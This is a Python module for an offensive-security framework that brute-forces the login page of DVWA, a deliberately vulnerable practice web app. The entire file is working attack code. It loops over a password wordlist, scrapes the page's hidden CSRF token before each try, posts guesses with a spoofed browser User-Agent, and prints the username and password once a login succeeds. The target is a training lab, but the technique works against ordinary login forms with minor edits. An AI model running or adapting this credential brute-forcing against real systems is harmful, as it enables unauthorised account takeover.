from deathnote_module import *
from lib.http.http_client import Http_client
from bs4 import BeautifulSoup

class Module(Auxiliary, Http_client):


	__info__ = {
			'name': 'Dvwa login brute force',
			'description': "Dvwa login brute force",
		}

	username = OptString("admin", "User:Pass or file with default credentials (file://)")
	password = OptFile("file://wordlists/password_list.txt", "User:Pass or file with default credentials (file://)")

	def get_token(self,source):
		soup = BeautifulSoup(source, "html.parser")
		return soup.find('input', { "type" : "hidden" })['value']


	def run(self):	

		print_success(f'File loaded, {str(len(self.password))} word found')
		for cpt,p in enumerate(self.password):
			print_success(str(cpt)+'/'+str(len(self.password))+' pass',end='\r')

			login = self.http_request(
					method="GET",
					path="/dvwa/login.php",
					session = True
					)				
			
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0', 'Upgrade-Insecure-Requests': '1'}
			data = {
					"username"   : self.username,
					"password"   : p.strip(),
					"Login"      : "Submit",
					"user_token" : self.get_token(login.text)
					}
			r = self.http_request(
					method="POST",
					path="/dvwa/login.php",
					data=data,
					headers=headers,
					session = True
				)
				
			if 'Login failed' not in r.text:
				print_success(f'Login = {self.username}')
				print_success(f'Password = {p}')
				break
